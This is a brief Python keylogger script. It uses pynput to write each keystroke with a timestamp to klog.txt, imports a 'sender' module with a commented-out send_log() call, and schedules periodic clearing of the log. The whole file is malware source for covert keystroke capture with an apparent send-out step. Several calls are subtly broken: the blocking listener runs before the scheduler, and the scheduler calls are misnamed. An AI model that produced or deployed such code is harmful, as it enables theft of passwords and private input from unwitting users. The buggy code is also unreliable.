#!/usr/bin/env python3

from pynput import keyboard
from datetime import datetime
import sender
import schedule
import time

def on_press(key):
    with open('klog.txt', 'a') as f:
        try:
            f.write(f'at: {datetime.now()} pressed: {key.char}\n')
        except AttributeError:
            f.write(f'at: {datetime.now()} pressed: {key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press= on_press, 
    on_release= on_release) as listener:
    listener.join()

def loop():
    #sender.send_log()
    clear_log()

def clear_log():
    with open('klog.txt', 'w') as log:
        log.truncate()

schedule.every(5).minute.do(loop)

while True:
    schedule.run.pending()
    time.sleep(1)
